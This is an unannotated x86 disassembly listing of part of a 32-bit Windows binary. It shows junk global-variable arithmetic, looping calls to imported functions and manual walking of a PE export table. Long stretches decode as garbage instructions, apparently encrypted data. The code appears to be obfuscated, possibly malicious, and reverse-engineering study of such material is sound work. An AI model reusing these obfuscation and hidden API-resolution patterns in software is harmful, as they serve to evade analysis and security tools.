  411a3f:	xchg   esi,ecx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x434577
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x4344f7,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x4345cf
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x4345cf,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x434537,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x4344ff,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x4344eb,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x434553,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x4345c3,0x43457b
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434613,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x4344f3,0x4344e7
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43460f,0x4345cb
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x43454f
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x4345b7,0x0
  411b01:	mov    esi,DWORD PTR ds:0x4345b7
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x4345b7,esi
  411b0e:	cmp    DWORD PTR ds:0x4345b7,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x4345b7,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x4345b7,0x434577
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x434537,0x4344e7
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x4345b7
  411b6a:	and    ecx,DWORD PTR ds:0x43458b
  411b70:	mov    DWORD PTR ds:0x4345b7,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43460f,0x13
  411b83:	cmp    DWORD PTR ds:0x43460f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43460f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434710
  411ba2:	push   0x4346b5
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43460f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43460f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x4344eb,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x4345cb,0x10
  411bd3:	cmp    DWORD PTR ds:0x4345cb,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x4345cb,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x4347d5
  411bfa:	push   0x4347e9
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x4345cb
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x4345cb,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	fistp  DWORD PTR [edx+0x76]
  411c74:	lods   eax,DWORD PTR ds:[esi]
  411c75:	aad    0x56
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411c6e
  411c7e:	loope  0x411ca1
  411c80:	xor    esp,DWORD PTR [esp+eax*8-0x75]
  411c84:	xchg   bh,bh
  411c86:	mov    al,ds:0xd52e86ae
  411c8b:	add    DWORD PTR [ebx],0xffffffd7
  411c8e:	mov    WORD PTR [esi-0x678596a],ss
  411c94:	mov    ds:0x10ab8ac5,al
  411c99:	sbb    ecx,DWORD PTR [edx-0x4d]
  411c9c:	jge    0x411c24
  411c9e:	xchg   esi,eax
  411c9f:	gs aaa 
  411ca1:	push   ds
  411ca2:	lods   eax,DWORD PTR ds:[esi]
  411ca3:	push   ds
  411ca4:	pop    esp
  411ca5:	pop    edx
  411ca6:	nop
  411ca7:	cmp    dh,dl
  411ca9:	or     eax,0xda57dede
  411cae:	pop    ebx
  411caf:	fs jo  0x411cd1
  411cb2:	cli    
  411cb3:	test   ch,al
  411cb5:	mov    edx,0x94438587
  411cba:	or     ch,bh
  411cbc:	sub    al,0x19
  411cbe:	data16 cli 
  411cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cc1:	and    BYTE PTR [edx-0x53],ah
  411cc4:	xchg   esi,eax
  411cc5:	scas   al,BYTE PTR es:[edi]
  411cc6:	(bad)
  411cc9:	and    BYTE PTR [esi+0x5cb55ebe],0x8a
  411cd0:	fcomp  DWORD PTR [ebx+eax*2+0x1b34acc1]
  411cd7:	dec    edx
  411cd8:	imul   ebp,ecx,0x99bb02f0
  411cde:	test   al,0xcf
  411ce0:	dec    esi
  411ce1:	sub    bh,BYTE PTR [ebp+0x71aeeae6]
  411ce7:	or     eax,0xfce86c23
  411cec:	mov    bh,0xc7
  411cee:	inc    eax
  411cef:	adc    al,0x3f
  411cf1:	xchg   esi,eax
  411cf2:	int    0xb3
  411cf4:	mov    al,0xc4
  411cf6:	cdq    
  411cf7:	adc    esp,DWORD PTR [ecx+eiz*8-0x12593629]
  411cfe:	ret    
  411cff:	and    al,BYTE PTR [edx+0x63]
  411d02:	inc    esp
  411d03:	pop    ds
  411d04:	mov    edx,0xce6a4cc7
  411d09:	jle    0x411d62
  411d0b:	ds mov ebp,0x7978aa7f
  411d11:	je     0x411d39
  411d13:	push   edi
  411d14:	fwait
  411d15:	sbb    eax,0xf743068c
  411d1a:	mov    ecx,0x311785f7
  411d1f:	fucom  st(0)
  411d21:	lock retf 
  411d23:	dec    ecx
  411d24:	lahf   
  411d25:	ins    DWORD PTR es:[edi],dx
  411d26:	std    
  411d27:	pushf  
  411d28:	scas   eax,DWORD PTR es:[edi]
  411d29:	(bad)  
  411d2a:	mov    cl,0x55
  411d2c:	shl    BYTE PTR [edx+0x79],0x64
  411d30:	loopne 0x411d29
  411d32:	jecxz  0x411d91
  411d34:	cmp    eax,DWORD PTR cs:[edx+edi*1+0x3e]
  411d39:	int    0x1f
  411d3b:	mov    cl,0xf
  411d3d:	in     eax,0x84
  411d3f:	xor    BYTE PTR [ebx-0x21],ch
  411d42:	aaa    
  411d43:	jnp    0x411d68
  411d45:	xchg   edx,eax
  411d46:	jl     0x411d9c
  411d48:	jnp    0x411d3e
  411d4a:	(bad)  
  411d4b:	adc    esp,DWORD PTR [ecx+ebx*1+0x51]
  411d4f:	cmp    DWORD PTR [ebx+0x5c],0x41
  411d53:	mov    bh,0x20
  411d55:	sbb    al,0x10
  411d57:	sbb    eax,DWORD PTR ds:0x63df7908
  411d5d:	sbb    ecx,DWORD PTR [ecx+0x7e]
  411d60:	dec    eax
  411d61:	pop    esi
  411d62:	lahf   
  411d63:	cmp    dh,BYTE PTR [ebx-0x1e]
  411d66:	cmp    DWORD PTR [edx],0x48
  411d69:	mov    ?,WORD PTR [ebp+0x5cfda494]
  411d6f:	fdiv   QWORD PTR [edx+ebx*4+0x25ca3d23]
  411d76:	push   0xfffffffc
  411d78:	mov    esi,0x1d32b060
  411d7d:	fwait
  411d7e:	cs jp  0x411d76
  411d81:	fst    DWORD PTR [eax]
  411d83:	dec    eax
  411d84:	outs   dx,DWORD PTR ds:[esi]
  411d85:	mov    edx,0x1ec662a1
  411d8a:	mov    ds:0x17d27f8,eax
  411d8f:	cli    
  411d90:	inc    edx
  411d91:	out    dx,eax
  411d92:	and    ecx,DWORD PTR [esi]
  411d94:	sbb    eax,0xbeda36cf
  411d99:	cmp    bl,BYTE PTR [ebp+0x5cb646d5]
  411d9f:	repz (bad) 
  411da1:	addr16 in al,0xdf
  411da4:	adc    bh,BYTE PTR [edx+eax*2+0x20a07110]
  411dab:	push   eax
  411dac:	cmp    al,0x33
  411dae:	lea    edi,[ebx+0x5b3491c0]
  411db4:	ins    DWORD PTR es:[edi],dx
  411db5:	push   0x81191931
  411dba:	std    
  411dbb:	fdivr  st,st(6)
  411dbd:	icebp  
  411dbe:	inc    ebx
  411dbf:	sub    bl,ch
  411dc1:	jo     0x411d8b
  411dc3:	mov    ds:0x29979718,eax
  411dc8:	loopne 0x411df9
  411dca:	clc    
  411dcb:	loope  0x411d84
  411dcd:	pop    esp
  411dce:	lods   eax,DWORD PTR ds:[esi]
  411dcf:	lock and dh,cl
  411dd2:	(bad)  [eax+0x3fec4c9c]
  411dd8:	sub    eax,0x8766e5b8
  411ddd:	and    ecx,DWORD PTR [ebp+ecx*8+0x6c7f4a4e]
  411de4:	outs   dx,DWORD PTR ds:[esi]
  411de5:	xchg   esi,eax
  411de6:	in     al,dx
  411de7:	mov    eax,ds:0x3eee3ea7
  411dec:	inc    edi
  411ded:	(bad)  
  411dee:	sbb    bh,BYTE PTR [ebx*4-0xcce6862]
  411df5:	stos   BYTE PTR es:[edi],al
  411df6:	outs   dx,DWORD PTR ds:[esi]
  411df7:	loope  0x411daa
  411df9:	loopne 0x411e2b
  411dfb:	loop   0x411df1
  411dfd:	es xchg edx,eax
  411dff:	(bad)  
  411e00:	mov    edi,0x40d9d8b
  411e05:	pushf  
  411e06:	jb     0x411de5
  411e08:	adc    bl,BYTE PTR [ecx-0x73]
  411e0b:	or     eax,0xe00e72f4
  411e10:	out    dx,eax
  411e11:	fstp   st(7)
  411e13:	out    0x7,al
  411e15:	xor    DWORD PTR [ebp+0x79],0x71
  411e19:	xchg   esp,eax
  411e1a:	mov    ds:0x99547add,al
  411e1f:	fist   WORD PTR [ecx+eiz*8]
  411e22:	addr16 gs push ds
  411e25:	cmp    edi,DWORD PTR ds:0x5b422d7d
  411e2b:	mov    cl,bl
  411e2d:	lods   eax,DWORD PTR ds:[si]
  411e2f:	jnp    0x411e8f
  411e31:	dec    ebx
  411e32:	mov    bh,0x7b
  411e34:	ds inc ebx
  411e36:	push   cs
  411e37:	mov    WORD PTR [eax+0x5e6dc066],?
  411e3d:	add    al,0xd5
  411e3f:	pop    ss
  411e40:	jb     0x411e63
  411e42:	mov    edi,ebx
  411e44:	fcmovnb st,st(4)
  411e46:	add    bh,bl
  411e48:	mov    edx,0xdf0d4fdc
  411e4d:	xchg   ebx,eax
  411e4e:	pop    edi
  411e4f:	leave  
  411e50:	mov    DWORD PTR [ecx],eax
  411e52:	cmp    eax,0x266d4be6
  411e57:	jbe    0x411e5d
  411e59:	adc    eax,0xd87465c1
  411e5e:	in     al,dx
  411e5f:	dec    edi
  411e60:	add    ecx,DWORD PTR [eax+edi*4]
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	into   
  411ec0:	enter  0x2fae,0x30
  411ec4:	push   eax
  411ec5:	jle    0x411f45
  411ec7:	pop    ecx
  411ec8:	jg     0x411f48
  411eca:	jle    0x411ede
  411ecc:	and    al,0x43
  411ece:	sub    DWORD PTR [ebp-0x720e8e14],ebx
  411ed4:	repz lds edx,FWORD PTR [edi+0x26]
  411ed8:	inc    DWORD PTR [ebp+0x588ccd46]
  411ede:	mov    bh,0xc7
  411ee0:	or     bh,dh
  411ee2:	iret   
  411ee3:	xchg   ecx,eax
  411ee4:	add    DWORD PTR [esi-0x5b0a349],esi
  411eea:	icebp  
  411eeb:	pop    esp
  411eec:	rcl    BYTE PTR [ebx+0x14c33e4],cl
  411ef2:	inc    esi
  411ef3:	icebp  
  411ef4:	push   es
  411ef5:	push   ss
  411ef6:	imul   esp,DWORD PTR [edx],0x88575e53
  411efc:	or     ebp,DWORD PTR [edx]
  411efe:	inc    eax
  411eff:	test   eax,0xc5ee5892
  411f04:	nop
  411f05:	scas   eax,DWORD PTR es:[edi]
  411f06:	imul   ecx,DWORD PTR [ebp-0x44],0x7b
  411f0a:	push   ecx
  411f0b:	dec    edx
  411f0c:	jp     0x411ed1
  411f0e:	sbb    esp,DWORD PTR [esi+0x591ca8ec]
  411f14:	scas   al,BYTE PTR es:[di]
  411f16:	data16 sti 
  411f18:	push   edi
  411f19:	pop    esp
  411f1a:	mov    al,ds:0x6c78f8db
  411f1f:	inc    ebx
  411f20:	dec    eax
  411f21:	lods   eax,DWORD PTR ds:[esi]
  411f22:	or     al,0x37
  411f24:	ja     0x411f0b
  411f26:	mov    ah,0x74
  411f28:	push   DWORD PTR [edi]
  411f2a:	cli    
  411f2b:	div    BYTE PTR [ebx-0x32f29e3]
  411f31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f32:	dec    ebp
  411f33:	mov    eax,ds:0xfa824b39
  411f38:	add    al,0xcb
  411f3a:	retf   
  411f3b:	push   0x45
  411f3d:	sub    ecx,esi
  411f3f:	and    ecx,DWORD PTR [eax-0x80]
  411f42:	adc    BYTE PTR [edi+eax*2+0x326804b5],0xd5
  411f4a:	in     al,dx
  411f4b:	lock jo 0x411f3d
  411f4e:	rol    al,1
  411f50:	sub    DWORD PTR [edi],0x457fa518
  411f56:	enter  0x4549,0xd6
  411f5a:	pushf  
  411f5b:	jb     0x411f76
  411f5d:	pop    esp
  411f5e:	nop
  411f5f:	pop    ebp
  411f60:	jmp    0x9acf:0xe4f2b2b5
  411f67:	fmul   QWORD PTR [esi]
  411f69:	cmp    BYTE PTR [edx],ch
  411f6b:	aad    0xd1
  411f6d:	popa   
  411f6e:	lods   eax,DWORD PTR ds:[esi]
  411f6f:	mov    ch,al
  411f71:	ret    0x1b07
  411f74:	xchg   edx,eax
  411f75:	bound  ecx,QWORD PTR [ecx+0x4d]
  411f78:	add    eax,0xc384629c
  411f7d:	push   ebp
  411f7e:	nop
  411f7f:	mov    bl,BYTE PTR ds:0x401e5d95
  411f85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f86:	(bad)  
  411f87:	out    0x8a,eax
  411f89:	mov    cl,0xe9
  411f8b:	test   BYTE PTR [edi],dl
  411f8d:	xor    al,0x69
  411f8f:	xlat   BYTE PTR ss:[ebx]
  411f91:	push   ecx
  411f92:	sbb    dh,0x2a
  411f95:	xchg   edi,eax
  411f96:	xchg   ebx,eax
  411f97:	jmp    DWORD PTR [edx]
  411f99:	xchg   esi,eax
  411f9a:	(bad)  
  411f9b:	pop    ebp
  411f9c:	cdq    
  411f9d:	sbb    BYTE PTR [ecx],ch
  411f9f:	and    dh,bh
  411fa1:	ds add eax,0xd101ad68
  411fa7:	lahf   
  411fa8:	fsubr  st,st(1)
  411faa:	and    eax,0xd9c6c6a
  411faf:	in     al,dx
  411fb0:	pop    edx
  411fb1:	jb     0x411f84
  411fb3:	fnstenv [ebp-0x20]
  411fb6:	pop    esp
  411fb7:	in     eax,dx
  411fb8:	sbb    ah,BYTE PTR [eax+0x2db3ffc2]
  411fbe:	rol    DWORD PTR [ebp+0x50],0x6c
  411fc2:	gs jbe 0x412032
  411fc5:	mov    ds:0x7d83c5ac,eax
  411fca:	arpl   di,sp
  411fcc:	loopne 0x411f68
  411fce:	jb     0x411fed
  411fd0:	std    
  411fd1:	and    eax,0x17a419de
  411fd6:	mov    esp,0xec375d0f
  411fdb:	dec    ecx
  411fdc:	les    edx,FWORD PTR [edx]
  411fde:	dec    ecx
  411fdf:	and    edx,DWORD PTR [edx-0x1d]
  411fe2:	imul   BYTE PTR [esi+0x46939342]
  411fe8:	or     al,0xcf
  411fea:	call   0x1e34831e
  411fef:	pop    esi
  411ff0:	ret    
  411ff1:	adc    BYTE PTR [eax+edi*8],ah
  411ff4:	in     eax,dx
  411ff5:	cld    
  411ff6:	nop
  411ff7:	adc    DWORD PTR [eax+0x7d],edx
  411ffa:	push   cs
  411ffb:	inc    esp
  411ffc:	retf   0x149c
  411fff:	scas   eax,DWORD PTR es:[edi]
  412000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412001:	push   0xffffffe3
  412003:	xchg   ebx,eax
  412004:	out    0x41,eax
  412006:	xchg   ebp,eax
  412007:	push   eax
  412008:	and    BYTE PTR [esi+0x76],0xf5
  41200c:	sahf   
  41200d:	sub    edi,edi
  41200f:	pop    esp
  412010:	or     al,BYTE PTR [edi+0x54]
  412013:	jmp    0x41206d
  412015:	mov    DWORD PTR [ecx-0x56512bec],ebp
  41201b:	out    0x92,eax
  41201d:	or     eax,DWORD PTR [edx]
  41201f:	mov    bl,0x3d
  412021:	cli    
  412022:	jmp    0x8014:0xf96669d3
  412029:	bound  ecx,QWORD PTR [ebx]
  41202b:	je     0x411fee
  41202d:	cmp    eax,0x4bfb0a1c
  412032:	cwde   
  412033:	ret    
  412034:	cmp    eax,0x9fc1801e
  412039:	(bad)  [ebx+0x337aaa27]
  41203f:	mov    esp,0xb3a47995
  412044:	mov    bh,0xe4
  412046:	arpl   sp,ax
  412048:	xchg   ecx,eax
  412049:	mov    ah,BYTE PTR [eax]
  41204b:	or     esi,edx
  41204d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41204e:	or     DWORD PTR [ebp+0x5d3c7b80],0x41ed39f3
  412058:	lea    ecx,[edx-0x6e]
  41205b:	inc    ebp
  41205c:	inc    esp
  41205d:	aad    0x36
  41205f:	pop    DWORD PTR [ebx+eiz*2]
  412062:	inc    BYTE PTR [esi+0x7]
  412065:	mov    bh,0x98
  412067:	lock xor eax,0x1e45fa6c
  41206d:	retf   0xbc95
  412070:	mov    ebx,DWORD PTR [edi]
  412072:	cmp    BYTE PTR ds:0xed0d,0xa6
  412078:	xor    al,0x1d
  41207a:	inc    edi
  41207b:	xchg   edx,eax
  41207c:	xor    eax,0xd2a8cdb9
  412081:	mov    ds:0x8a7ec89b,al
  412086:	jle    0x412075
  412088:	psubusw mm6,QWORD PTR [edx]
  41208b:	pop    ds
  41208c:	and    esi,DWORD PTR [esi]
  41208e:	lods   al,BYTE PTR ds:[esi]
  41208f:	mov    edx,0x68d09f61
  412094:	nop
  412095:	enter  0x5e3d,0xc4
  412099:	retf   0x829c
  41209c:	int3   
  41209d:	push   cs
  41209e:	icebp  
  41209f:	jnp    0x41210e
  4120a1:	mov    esp,0x51960d0b
  4120a6:	(bad)  
  4120a7:	mov    ebx,0x828f92
  4120ac:	cmp    eax,0xec4d8b4f
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	hlt    
  4120c6:	jle    0x41205e
  4120c8:	jl     0x4120dd
  4120ca:	push   edx
  4120cb:	jle    0x41214b
  4120cd:	pop    ecx
  4120ce:	jg     0x41214e
  4120d0:	jle    0x41208f
  4120d2:	mov    dh,0x39
  4120d4:	daa    
  4120d5:	jge    0x4120e6
  4120d7:	pop    edx
  4120d8:	mov    ah,0x1a
  4120da:	aam    0xf
  4120dc:	push   ecx
  4120dd:	sub    esi,DWORD PTR [edi+0x5a]
  4120e0:	test   BYTE PTR [eax-0x77],ah
  4120e3:	mov    esi,0x19c40e3c
  4120e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120e9:	xchg   ebx,eax
  4120ea:	into   
  4120eb:	sbb    edx,DWORD PTR [ebx+eax*4-0x2]
  4120ef:	push   0x66986a26
  4120f4:	and    BYTE PTR [edx-0x13eae776],bh
  4120fa:	push   0x6732aed3
  4120ff:	outs   dx,DWORD PTR ds:[esi]
  412100:	test   eax,0x5d427b79
  412105:	mov    ebx,es
  412107:	mov    ecx,edx
  412109:	or     DWORD PTR [ebx],eax
  41210b:	test   BYTE PTR [ebx-0x3905a8fb],al
  412111:	cmp    ax,WORD PTR [ebx-0x1a282fbe]
  412118:	add    DWORD PTR [ecx],esp
  41211a:	pop    es
  41211b:	ret    0xb4dd
  41211e:	or     DWORD PTR [ebx+esi*8],esi
  412121:	and    esp,DWORD PTR [edx+0x20]
  412124:	enter  0x11bb,0x21
  412128:	enter  0x8a94,0xd0
  41212c:	pop    ss
  41212d:	cdq    
  41212e:	xlat   BYTE PTR ds:[ebx]
  41212f:	jecxz  0x4120df
  412131:	frstor [eax]
  412133:	cli    
  412134:	pop    ebp
  412135:	xchg   ebx,eax
  412136:	pop    ebp
  412137:	pop    ebp
  412138:	pop    edi
  412139:	add    eax,0x99ff17d8
  41213e:	aaa    
  41213f:	sub    BYTE PTR [eax-0x5db9f5ef],dh
  412145:	add    eax,0x898003c9
  41214a:	sbb    eax,0x75e2086d
  41214f:	outs   dx,DWORD PTR ds:[esi]
  412150:	stos   BYTE PTR es:[edi],al
  412151:	(bad)  
  412152:	(bad)  
  412153:	shl    BYTE PTR [ebp-0x6d],0x57
  412157:	adc    DWORD PTR [esp+ebp*4-0x51],ecx
  41215b:	mov    ecx,0xbda09bf4
  412160:	test   BYTE PTR [eax+0x50fa3936],bh
  412166:	lahf   
  412167:	mov    ch,0xd0
  412169:	inc    edi
  41216a:	ja     0x4121b6
  41216c:	mov    WORD PTR [ecx],es
  41216e:	js     0x412120
  412170:	pushf  
  412171:	xchg   ebx,eax
  412172:	shr    DWORD PTR [ebp-0x7965580c],1
  412178:	cmp    eax,0x8bbf733d
  41217d:	inc    ecx
  41217e:	cmp    BYTE PTR [esi-0x7d0200f6],dl
  412184:	mov    dl,0x31
  412186:	jb     0x4121c4
  412188:	mov    eax,0x5aec6c36
  41218d:	inc    esi
  41218e:	sub    eax,0x82e096b7
  412193:	mov    BYTE PTR [eax],ch
  412195:	and    al,0xf2
  412197:	push   ebp
  412198:	fmul   QWORD PTR [ebx-0x16fe8063]
  41219e:	pop    esp
  41219f:	xor    eax,0x7abe91cf
  4121a4:	xchg   ebx,eax
  4121a5:	in     eax,0xee
  4121a7:	jns    0x412188
  4121a9:	mov    ds:0x2a2d0644,al
  4121ae:	paddb  mm5,QWORD PTR [edi]
  4121b1:	aas    
  4121b2:	push   eax
  4121b3:	lea    ebp,[ebx]
  4121b5:	les    edx,FWORD PTR [ecx-0xdb2eeae]
  4121bb:	adc    edx,DWORD PTR [eax]
  4121bd:	retf   
  4121be:	lahf   
  4121bf:	cmp    DWORD PTR [ecx+0x15],esi
  4121c2:	push   edi
  4121c3:	push   ecx
  4121c4:	inc    ebx
  4121c5:	pop    eax
  4121c6:	stos   BYTE PTR es:[edi],al
  4121c7:	adc    al,0x57
  4121c9:	imul   ebx,DWORD PTR cs:[ebx-0x4f6bdd2d],0x69578381
  4121d4:	mov    ch,0x65
  4121d6:	inc    eax
  4121d7:	inc    al
  4121d9:	sbb    BYTE PTR [eax-0x48],ch
  4121dc:	and    eax,0x508419a6
  4121e1:	cs pop esi
  4121e3:	push   0xf9ce9e80
  4121e8:	scas   al,BYTE PTR es:[edi]
  4121e9:	pop    esi
  4121ea:	sbb    BYTE PTR [esi+eax*8],cl
  4121ed:	outs   dx,BYTE PTR ds:[esi]
  4121ee:	add    eax,esp
  4121f0:	aaa    
  4121f1:	xchg   ecx,eax
  4121f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121f3:	nop
  4121f4:	jecxz  0x41224f
  4121f6:	or     ch,BYTE PTR [eax-0x63]
  4121f9:	scas   eax,DWORD PTR es:[edi]
  4121fa:	add    BYTE PTR [edi-0x46],dl
  4121fd:	stos   BYTE PTR es:[edi],al
  4121fe:	imul   ebx,DWORD PTR [ebx-0x5f8fba9],0x14
  412205:	pop    eax
  412206:	shr    BYTE PTR [ebx],0x49
  412209:	adc    ebx,DWORD PTR [ecx]
  41220b:	mov    ecx,0xce2c466a
  412210:	xchg   esi,eax
  412211:	cwde   
  412212:	pop    ecx
  412213:	mov    esp,DWORD PTR [ecx-0x427cf61e]
  412219:	push   esp
  41221a:	repz or DWORD PTR [ebx+0x31e4eb6b],0xb128007f
  412225:	fs dec edx
  412227:	mov    edx,0x3d20bd25
  41222c:	and    ebp,0xcb1e3351
  412232:	cld    
  412233:	fwait
  412234:	push   esi
  412235:	push   ebp
  412236:	out    0xc0,al
  412238:	xor    al,0x8d
  41223a:	adc    DWORD PTR [edi+0x36],eax
  41223d:	fcmovb st,st(0)
  41223f:	mov    BYTE PTR [ebx-0x3b612ea4],bh
  412245:	xor    al,0xb4
  412247:	jge    0x412215
  412249:	pop    edx
  41224a:	mov    ds:0x62897f17,al
  41224f:	jo     0x4122c4
  412251:	test   al,0x0
  412253:	ret    0x60c
  412256:	and    eax,0xc7509db1
  41225b:	adc    DWORD PTR [esi],0xacb244b4
  412261:	mov    eax,ds:0xf021f818
  412266:	dec    edi
  412267:	push   ebx
  412268:	aaa    
  412269:	adc    ah,BYTE PTR [edx]
  41226b:	sub    al,0x35
  41226d:	out    0x76,al
  41226f:	jg     0x412203
  412271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412272:	sub    al,BYTE PTR [eax]
  412274:	sbb    al,0x35
  412276:	jnp    0x41222f
  412278:	pusha  
  412279:	(bad)  
  41227a:	retf   0xd0d9
  41227d:	stos   BYTE PTR es:[edi],al
  41227e:	sbb    BYTE PTR [edx+0x1baf0560],cl
  412284:	inc    esp
  412285:	scas   eax,DWORD PTR es:[edi]
  412286:	mov    ebx,0x38ffd4c4
  41228b:	add    dl,bh
  41228d:	push   ds
  41228e:	inc    si
  412290:	mov    al,ds:0xd9a05b26
  412295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412296:	adc    eax,0x8937f400
  41229b:	mov    eax,0x77eb1695
  4122a0:	outs   dx,DWORD PTR ds:[esi]
  4122a1:	sub    dl,al
  4122a3:	mov    esp,0x44f6cbcf
  4122a8:	bound  esi,QWORD PTR [ebp+0x65]
  4122ab:	mov    bh,0x16
  4122ad:	test   al,0xc6
  4122af:	mov    eax,ds:0xee350a21
  4122b4:	mov    DWORD PTR [ebp+0xc],eax
  4122b7:	mov    eax,DWORD PTR [ebp-0x4]
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
